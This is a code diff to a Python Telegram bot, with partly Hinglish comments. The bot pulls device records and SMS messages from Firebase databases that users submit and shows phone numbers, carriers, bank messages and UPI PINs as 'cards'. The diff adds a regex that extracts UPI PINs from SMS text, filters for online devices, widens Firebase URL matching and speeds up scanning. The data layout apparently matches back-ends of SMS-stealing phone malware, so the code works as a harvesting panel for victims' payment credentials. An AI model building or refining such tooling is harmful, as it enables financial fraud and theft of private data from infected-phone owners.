@@ -6,7 +6,6 @@ import asyncio
 import logging
 import sqlite3
 from datetime import datetime, timedelta
-from concurrent.futures import ThreadPoolExecutor
 
 import aiosqlite
 import aiohttp
@@ -34,18 +33,16 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Global thread pool for DB sync ops (fallback safety)
-_DB_POOL = ThreadPoolExecutor(max_workers=4)
-
 # ══════════════════════════════════════════════════════
-# 🎯 TASK TRACKING (MULTI-USER SAFE)
+# 🎯 GLOBAL STATE
 # ══════════════════════════════════════════════════════
 ACTIVE_TASKS = {}          # {user_id: asyncio.Task}
-AUTH_CACHE = {}            # {user_id: (allowed: bool, ts: float, reason: str)}
+AUTH_CACHE = {}            # {user_id: (allowed: bool, ts: float, reason: str|None)}
 AUTH_CACHE_TTL = 60        # seconds
+USER_STATES = {}           # {user_id: state dict}
 
 # ══════════════════════════════════════════════════════
-# 🌐 SHARED HTTP SESSION (SPEED BOOST)
+# 🌐 SHARED HTTP SESSION
 # ══════════════════════════════════════════════════════
 _HTTP = None
 _HTTP_LOCK = asyncio.Lock()
@@ -74,9 +71,9 @@ async def close_http():
         _HTTP = None
 
 # ══════════════════════════════════════════════════════
-# 🚦 FIREBASE PER-URL RATE LIMITER (prevents 429/ban)
+# 🚦 FIREBASE PER-URL RATE LIMITER
 # ══════════════════════════════════════════════════════
-FIREBASE_SEM = {}          # {url: Semaphore(3)}
+FIREBASE_SEM = {}
 FIREBASE_SEM_LOCK = asyncio.Lock()
 
 async def get_fb_sem(url: str) -> asyncio.Semaphore:
@@ -86,7 +83,7 @@ async def get_fb_sem(url: str) -> asyncio.Semaphore:
         return FIREBASE_SEM[url]
 
 # ══════════════════════════════════════════════════════
-# 🗄️ DATABASE (aiosqlite + WAL = NO LOCK)
+# 🗄️ DATABASE (aiosqlite + WAL)
 # ══════════════════════════════════════════════════════
 async def init_db():
     async with aiosqlite.connect(DB_PATH) as db:
@@ -98,16 +95,17 @@ async def init_db():
                (user_id INTEGER PRIMARY KEY, name TEXT, username TEXT,
                 expiry TEXT, banned INTEGER DEFAULT 0, verified INTEGER DEFAULT 0)'''
         )
-        # Migrations
-        for col, dtype in [
-            ("username", "TEXT"),
-            ("verified", "INTEGER DEFAULT 0"),
-            ("banned", "INTEGER DEFAULT 0"),
-        ]:
-            try:
-                await db.execute(f"ALTER TABLE users ADD COLUMN {col} {dtype}")
-            except aiosqlite.OperationalError:
-                pass
+        await db.commit()
+
+        async with db.execute("PRAGMA table_info(users)") as cur:
+            cols = {row[1] for row in await cur.fetchall()}
+
+        if "username" not in cols:
+            await db.execute("ALTER TABLE users ADD COLUMN username TEXT")
+        if "verified" not in cols:
+            await db.execute("ALTER TABLE users ADD COLUMN verified INTEGER DEFAULT 0")
+        if "banned" not in cols:
+            await db.execute("ALTER TABLE users ADD COLUMN banned INTEGER DEFAULT 0")
         await db.commit()
 
 async def get_user(user_id: int):
@@ -164,7 +162,7 @@ async def set_verified(user_id: int):
                 "UPDATE users SET verified = 1 WHERE user_id = ?", (user_id,)
             )
             await db.commit()
-        AUTH_CACHE.pop(user_id, None)
+        AUTH_CACHE[user_id] = (True, time.time(), None)
     except Exception as e:
         logger.error(f"set_verified failed uid={user_id}: {e}")
 
@@ -225,10 +223,8 @@ async def get_all_user_ids():
         return []
 
 # ══════════════════════════════════════════════════════
-# 🧠 PER-USER STATE (with cleanup)
+# 🧠 PER-USER STATE
 # ══════════════════════════════════════════════════════
-USER_STATES = {}
-
 def get_user_state(user_id):
     if user_id not in USER_STATES:
         USER_STATES[user_id] = {
@@ -246,11 +242,33 @@ def get_user_state(user_id):
         USER_STATES[user_id]["last_active"] = time.time()
     return USER_STATES[user_id]
 
+async def _cancel_user_tasks(user_id: int):
+    """Safely cancel user tasks — kill_switch SET first, then replace"""
+    task = ACTIVE_TASKS.pop(user_id, None)
+    st = USER_STATES.get(user_id) or get_user_state(user_id)
+
+    st["kill_switch"].set()
+    st["scan_active"] = False
+    st["search_active"] = False
+    st["upi_active"] = False
+
+    if task and not task.done():
+        task.cancel()
+        try:
+            await asyncio.wait_for(task, timeout=3)
+        except (asyncio.CancelledError, asyncio.TimeoutError):
+            pass
+        except Exception as e:
+            logger.warning(f"cancel warn user={user_id}: {e}")
+
+    st["kill_switch"] = asyncio.Event()
+    return st
+
 async def cleanup_loop():
-    """Periodic cleanup — memory leak fix"""
+    """Memory leak fix — periodic cleanup"""
     while True:
         try:
-            await asyncio.sleep(300)  # every 5 min
+            await asyncio.sleep(300)
             now = time.time()
             dead = []
             for uid, st in list(USER_STATES.items()):
@@ -261,11 +279,9 @@ async def cleanup_loop():
             for uid in dead:
                 await _cancel_user_tasks(uid)
                 USER_STATES.pop(uid, None)
-            # Auth cache cleanup
             for uid, (_, ts, _) in list(AUTH_CACHE.items()):
                 if now - ts > 300:
                     AUTH_CACHE.pop(uid, None)
-            # Firebase sem cleanup (empty firebases)
             if dead:
                 logger.info(f"cleanup: removed {len(dead)} idle user states")
         except asyncio.CancelledError:
@@ -273,35 +289,14 @@ async def cleanup_loop():
         except Exception as e:
             logger.error(f"cleanup_loop error: {e}")
 
-async def _cancel_user_tasks(user_id: int):
-    """User ke saare tasks safely cancel — STOP ka asli fix"""
-    task = ACTIVE_TASKS.pop(user_id, None)
-    if task and not task.done():
-        task.cancel()
-        try:
-            await asyncio.wait_for(task, timeout=3)
-        except (asyncio.CancelledError, asyncio.TimeoutError):
-            pass
-        except Exception as e:
-            logger.warning(f"cancel warn user={user_id}: {e}")
-    st = USER_STATES.get(user_id)
-    if st:
-        st["scan_active"] = False
-        st["search_active"] = False
-        st["upi_active"] = False
-        st["kill_switch"] = asyncio.Event()
-        return st
-    return get_user_state(user_id)
-
 # ══════════════════════════════════════════════════════
-# 🔐 AUTH GUARD (with cache)
+# 🔐 AUTH GUARD
 # ══════════════════════════════════════════════════════
 async def check_auth(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> bool:
     uid = update.effective_user.id
     if uid == OWNER_ID:
         return True
 
-    # Cache hit
     cached = AUTH_CACHE.get(uid)
     if cached and (time.time() - cached[1]) < AUTH_CACHE_TTL:
         allowed, _, reason = cached
@@ -444,18 +439,20 @@ def parse_sms_date(ts_str: str) -> datetime:
 def is_recent(ts_str: str, days=30) -> bool:
     try:
         dt = parse_sms_date(ts_str)
-        return dt >= (datetime.now() - timedelta(days=days)) or dt > datetime.now()
+        now = datetime.now()
+        return (now - timedelta(days=days)) <= dt <= (now + timedelta(hours=1))
     except Exception:
         return True
 
 # ══════════════════════════════════════════════════════
-# FIREBASE HELPERS (rate limited + retry)
+# FIREBASE HELPERS
 # ══════════════════════════════════════════════════════
 async def fb_get(url: str, path: str, timeout=6, retries=2):
-    sem = await get_fb_sem(url)
     for attempt in range(retries + 1):
-        try:
-            async with sem:
+        sem = await get_fb_sem(url)
+        was_429 = False
+        async with sem:
+            try:
                 session = await get_http()
                 async with session.get(
                     f"{url}/{path}.json",
@@ -466,18 +463,17 @@ async def fb_get(url: str, path: str, timeout=6, retries=2):
                         if txt and txt != "null":
                             return json.loads(txt)
                         return None
-                    if r.status == 429:
-                        wait = min(2 ** attempt, 8)
-                        await asyncio.sleep(wait)
-                        continue
-                    return None
-        except asyncio.CancelledError:
-            raise
-        except asyncio.TimeoutError:
-            if attempt == retries:
-                return None
-        except Exception as e:
-            logger.debug(f"fb_get fail {url}/{path} attempt={attempt}: {e}")
+                    was_429 = (r.status == 429)
+            except asyncio.CancelledError:
+                raise
+            except asyncio.TimeoutError:
+                pass
+            except Exception as e:
+                logger.debug(f"fb_get fail {url}/{path}: {e}")
+        if was_429 and attempt < retries:
+            wait = min(2 ** attempt, 8)
+            logger.warning(f"429 on {url} — waiting {wait}s")
+            await asyncio.sleep(wait)
     return None
 
 async def validate_firebase(url: str) -> bool:
@@ -492,12 +488,31 @@ async def validate_firebase(url: str) -> bool:
     return False
 
 def parse_devices(data) -> list:
+    """SIRF ONLINE devices return karta hai (status == True)"""
     devs = []
     if not data or not isinstance(data, dict):
         return devs
     for dev_id, d in data.items():
-        if not isinstance(d, dict) or not d.get("status"):
+        if not isinstance(d, dict):
             continue
+        # ✅ SIRF ONLINE — offline skip
+        if not d.get("status"):
+            continue
+
+        raw_pin = d.get("upipin", "")
+        pin_str = ""
+        if isinstance(raw_pin, str):
+            pin_str = raw_pin.strip()
+        elif isinstance(raw_pin, (int, float)):
+            pin_str = str(raw_pin)
+        elif isinstance(raw_pin, dict):
+            pin_str = str(raw_pin.get("pin") or raw_pin.get("value") or "")
+        elif isinstance(raw_pin, list):
+            pin_str = str(raw_pin[0]) if raw_pin else ""
+
+        if pin_str.lower() in ("", "null", "none", "false", "0"):
+            pin_str = ""
+
         sims = d.get("sims") or []
         if isinstance(sims, dict):
             sims = list(sims.values())
@@ -507,7 +522,7 @@ def parse_devices(data) -> list:
             "battery": d.get("battery", "?"),
             "mobNo": d.get("mobNo", ""),
             "sims": sims,
-            "upipin": d.get("upipin", ""),
+            "upipin": pin_str,
         })
     return devs
 
@@ -523,12 +538,11 @@ def parse_msgs(data) -> list:
             txt = m.get("message") or m.get("body") or m.get("text") or ""
             sender = m.get("sender") or m.get("from") or ""
             ts = str(m.get("timestamp") or m.get("date") or "")
-            ts_val = 0
-            try:
-                ts_val = float(ts.replace("-", ""))
-            except Exception:
-                pass
             if txt:
+                try:
+                    ts_val = parse_sms_date(ts).timestamp()
+                except Exception:
+                    ts_val = 0.0
                 msgs.append({
                     "message": txt,
                     "sender": sender,
@@ -542,7 +556,7 @@ def parse_msgs(data) -> list:
 # 🎨 CARDS
 # ══════════════════════════════════════════════════════
 def format_deep_scan_card(fb_label: str, dev: dict, bank_msgs: list) -> str:
-    pin = str(dev.get("upipin", "")).split("|")[0].strip()
+    pin = dev.get("upipin", "").split("|")[0].strip()
     carrier = dev["sims"][0].get("carrierName") if dev["sims"] else "—"
     mob = dev['mobNo'] if dev['mobNo'] else "Not Available"
 
@@ -582,7 +596,7 @@ def format_deep_scan_card(fb_label: str, dev: dict, bank_msgs: list) -> str:
     return "\n".join(lines)
 
 def format_upi_card(fb_label: str, dev: dict) -> str:
-    pin = str(dev.get("upipin", "")).split("|")[0].strip()
+    pin = dev.get("upipin", "").split("|")[0].strip()
     carrier = dev["sims"][0].get("carrierName") if dev["sims"] else "—"
     mob = dev['mobNo'] if dev['mobNo'] else "Not Available"
     return (
@@ -1012,7 +1026,7 @@ async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     await process_urls(update, ctx, text)
 
 # ══════════════════════════════════════════════════════
-# 📢 BROADCAST (batched — no freeze)
+# 📢 BROADCAST
 # ══════════════════════════════════════════════════════
 async def broadcast_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     user_ids = await get_all_user_ids()
@@ -1037,7 +1051,6 @@ async def broadcast_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         except Exception:
             return False
 
-    # Batch of 25, sleep 1s (respects 30 msg/sec limit)
     for i in range(0, len(user_ids), 25):
         batch = user_ids[i:i + 25]
         results = await asyncio.gather(
@@ -1101,7 +1114,7 @@ async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     await process_urls(update, ctx, content, msg)
 
 # ══════════════════════════════════════════════════════
-# 🔍 SEARCH
+# 🔍 SEARCH (SIRF ONLINE)
 # ══════════════════════════════════════════════════════
 async def perform_realtime_search(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
                                    keyword: str, state):
@@ -1112,7 +1125,8 @@ async def perform_realtime_search(update: Update, ctx: ContextTypes.DEFAULT_TYPE
         f"⚡ <b>SEARCHING FOR '{keyword}'...</b>", parse_mode="HTML"
     )
     found_count = 0
-    sem = asyncio.Semaphore(8)
+    sem = asyncio.Semaphore(5)
+    stopped = False
 
     async def search_dev(fb, dev):
         nonlocal found_count
@@ -1131,7 +1145,7 @@ async def perform_realtime_search(update: Update, ctx: ContextTypes.DEFAULT_TYPE
             ]
             if not matches:
                 return
-            pin = str(dev.get("upipin", "")).split("|")[0].strip()
+            pin = dev.get("upipin", "").split("|")[0].strip()
             card = "🎯 <b>MATCH FOUND</b>\n"
             card += f"📁 <b>DB:</b> <code>{fb['label']}</code> | 🆔 <b>ID:</b> <code>{dev['id']}</code>\n"
             card += f"📱 {dev['mobNo']} | 📲 {dev['model']}\n"
@@ -1149,28 +1163,32 @@ async def perform_realtime_search(update: Update, ctx: ContextTypes.DEFAULT_TYPE
     try:
         for fb in list(state["firebases"].values()):
             if local_kill.is_set():
+                stopped = True
                 break
             data = await fb_get(fb["url"], "clients", timeout=5)
             if not data or local_kill.is_set():
                 continue
-            devices = parse_devices(data)
+            devices = parse_devices(data)   # ✅ SIRF ONLINE
             await asyncio.gather(
                 *[search_dev(fb, d) for d in devices], return_exceptions=True
             )
-        if local_kill.is_set():
+
+        if stopped or local_kill.is_set():
             try:
-                await msg.edit_text("🛑 <b>SEARCH STOPPED</b>", parse_mode="HTML")
+                await msg.edit_text(
+                    f"🛑 <b>SEARCH STOPPED</b>\nFound so far: <b>{found_count}</b>",
+                    parse_mode="HTML"
+                )
             except Exception:
                 pass
         else:
-            state["search_active"] = False
             await msg.edit_text(
                 f"✅ <b>SEARCH COMPLETE</b>\nFound <b>{found_count}</b> devices.",
                 parse_mode="HTML"
             )
     except asyncio.CancelledError:
         try:
-            await msg.edit_text("🛑 <b>SEARCH STOPPED</b>", parse_mode="HTML")
+            await msg.edit_text("🛑 <b>SEARCH CANCELLED</b>", parse_mode="HTML")
         except Exception:
             pass
         raise
@@ -1178,24 +1196,46 @@ async def perform_realtime_search(update: Update, ctx: ContextTypes.DEFAULT_TYPE
         state["search_active"] = False
 
 # ══════════════════════════════════════════════════════
-# 🫆 UPI SCAN
+# 🫆 UPI SCAN (SIRF ONLINE)
 # ══════════════════════════════════════════════════════
 async def scan_upi_pins(ctx: ContextTypes.DEFAULT_TYPE, user_id: int, state):
     local_kill = state["kill_switch"]
     found_count = 0
-    sem = asyncio.Semaphore(10)
+    stopped = False
+    sem = asyncio.Semaphore(5)
 
     async def check_dev(fb, dev):
         nonlocal found_count
         if local_kill.is_set():
             return
         async with sem:
-            raw_pin = str(dev.get("upipin", "")).strip()
-            if not raw_pin or raw_pin.lower() == "null" or local_kill.is_set():
+            if local_kill.is_set():
                 return
+
+            pin = dev.get("upipin", "").strip()
+
+            # Agar clients node se nahi mila, messages se dhundo
+            if not pin:
+                mdata = await fb_get(fb["url"], f"messages/{dev['id']}", timeout=4)
+                if mdata and not local_kill.is_set():
+                    for m in parse_msgs(mdata):
+                        match = re.search(
+                            r'(?:upi\s*pin|pin\s*(?:is|set|:)|create\s*pin)'
+                            r'[^\d]{0,10}(\d{4,6})',
+                            m["message"], re.IGNORECASE
+                        )
+                        if match:
+                            pin = match.group(1)
+                            break
+
+            if not pin or local_kill.is_set():
+                return
+
+            dev_copy = dict(dev)
+            dev_copy["upipin"] = pin
             try:
                 await ctx.bot.send_message(
-                    user_id, format_upi_card(fb["label"], dev), parse_mode="HTML"
+                    user_id, format_upi_card(fb["label"], dev_copy), parse_mode="HTML"
                 )
                 found_count += 1
             except Exception as e:
@@ -1204,24 +1244,41 @@ async def scan_upi_pins(ctx: ContextTypes.DEFAULT_TYPE, user_id: int, state):
     try:
         for fb in list(state["firebases"].values()):
             if local_kill.is_set():
-                return
+                stopped = True
+                break
             data = await fb_get(fb["url"], "clients", timeout=5)
             if not data or local_kill.is_set():
                 continue
-            devices = parse_devices(data)
+            devices = parse_devices(data)   # ✅ SIRF ONLINE
             await asyncio.gather(
                 *[check_dev(fb, d) for d in devices], return_exceptions=True
             )
-        if not local_kill.is_set():
+
+        if stopped or local_kill.is_set():
+            try:
+                await ctx.bot.send_message(
+                    user_id,
+                    f"🛑 <b>UPI SCAN STOPPED</b>\nFound so far: <b>{found_count}</b>",
+                    parse_mode="HTML"
+                )
+            except Exception:
+                pass
+        else:
             await ctx.bot.send_message(
                 user_id,
                 f"✅ <b>UPI SCAN COMPLETE</b>\nFound <b>{found_count}</b> devices.",
                 parse_mode="HTML"
             )
     except asyncio.CancelledError:
-        return
+        try:
+            await ctx.bot.send_message(
+                user_id, "🛑 <b>UPI SCAN CANCELLED</b>", parse_mode="HTML"
+            )
+        except Exception:
+            pass
+        raise
     except Exception as e:
-        logger.error(f"upi scan crash uid={user_id}: {e}")
+        logger.error(f"upi scan crash uid={user_id}: {e}", exc_info=True)
     finally:
         state["upi_active"] = False
 
@@ -1232,7 +1289,8 @@ async def process_urls(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
                        text: str, msg=None):
     state = get_user_state(update.effective_user.id)
     urls = re.findall(
-        r'https?://[a-zA-Z0-9\-]+-default-rtdb\.(?:firebaseio\.com|asia-southeast1\.firebasedatabase\.app|europe-west1\.firebasedatabase\.app)',
+        r'https?://[a-zA-Z0-9\-]+(?:\.[a-zA-Z0-9\-]+)*'
+        r'\.(?:firebaseio\.com|firebasedatabase\.app)',
         text
     )
     urls = list(set(urls))
@@ -1279,7 +1337,7 @@ async def process_urls(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
         pass
 
 # ══════════════════════════════════════════════════════
-# ⚡ BACKGROUND SCANNER (FAST + STOP FIX)
+# ⚡ BACKGROUND SCANNER (SIRF ONLINE)
 # ══════════════════════════════════════════════════════
 async def background_scanner(bot, user_id: int, state):
     local_kill = state["kill_switch"]
@@ -1336,8 +1394,11 @@ async def background_scanner(bot, user_id: int, state):
 
     try:
         while not local_kill.is_set():
-            if not state["scan_active"] or not state["firebases"]:
-                await asyncio.sleep(0.5)
+            if not state["scan_active"]:
+                logger.info(f"scanner exiting (inactive) uid={user_id}")
+                return
+            if not state["firebases"]:
+                await asyncio.sleep(1)
                 continue
 
             for fb in list(state["firebases"].values()):
@@ -1346,8 +1407,7 @@ async def background_scanner(bot, user_id: int, state):
                 data = await fb_get(fb["url"], "clients", timeout=6)
                 if not data or local_kill.is_set():
                     continue
-                devices = parse_devices(data)
-                # Timeout guard on gather
+                devices = parse_devices(data)   # ✅ SIRF ONLINE
                 try:
                     await asyncio.wait_for(
                         asyncio.gather(
@@ -1361,7 +1421,6 @@ async def background_scanner(bot, user_id: int, state):
                 if local_kill.is_set():
                     return
 
-            # sleep with kill check
             for _ in range(3):
                 if local_kill.is_set():
                     return
@@ -1378,7 +1437,6 @@ async def background_scanner(bot, user_id: int, state):
 # 🚀 BOT STARTUP
 # ══════════════════════════════════════════════════════
 async def post_init(app: Application):
-    """Background tasks start karne ke liye"""
     asyncio.create_task(cleanup_loop())
     logger.info("cleanup_loop started")
 
@@ -1401,7 +1459,7 @@ async def run_bot():
                 connection_pool_size=50,
             )
         )
-        .concurrent_updates(20)  # SAFE for SQLite
+        .concurrent_updates(20)
         .post_init(post_init)
         .build()
     )
